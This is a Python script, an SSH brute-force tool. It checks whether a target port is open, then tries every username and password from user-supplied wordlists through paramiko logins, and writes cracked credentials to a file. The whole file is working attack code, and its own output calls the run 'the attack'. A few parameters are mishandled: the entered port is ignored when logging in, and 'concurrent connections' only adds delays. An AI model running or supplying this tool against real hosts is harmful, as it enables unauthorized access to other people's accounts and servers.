import paramiko
import socket
import random
import time

def ssh_password_login(ip, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=timeout)
        client.close()
        return True
    except Exception:
        client.close()
        return False

def check_open_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return True
        else:
            return False
    except Exception:
        return False

def save_to_file(file_path, content):
    with open(file_path, 'a') as f:
        f.write(content + '\n')

if __name__ == '__main__':
    ip = input("Enter the IP address of the host: ")
    port = int(input("Enter the port number (default: 22): "))
    username_file = input("Enter the file path containing usernames to try: ")
    password_file = input("Enter the file path containing passwords to try: ")
    concurrent_connections = int(input("Enter the number of concurrent connections: "))
    timeout = int(input("Enter the timeout in seconds for each connection: "))
    random_order = input("Try passwords in random order? (yes/no): ")
    save_success = input("Save successful logins to file? (yes/no): ")
    save_failure = input("Save failed logins to file? (yes/no): ")

    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()
    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()
    
    if check_open_port(ip, port):
        if random_order.lower() == 'yes':
            random.shuffle(passwords)
        for username in usernames:
            for i, password in enumerate(passwords):
                if i % concurrent_connections == 0:
                    time.sleep(1)
                if ssh_password_login(ip, username, password, timeout):
                    if save_success.lower() == 'yes':
                        save_to_file("successful_logins.txt", f"{username}:{password}")
                    print(f"Successful login with username: {username} and password: {password}")
                    break
                else:
                    if save_failure.lower() == 'yes':
                        save_to_file("failed_logins.txt", f"{username}:{password}")
                    print(f"Login failed for username: {username} and password: {password}")
    else:
        print("Port 22 is closed, cannot perform the attack.")
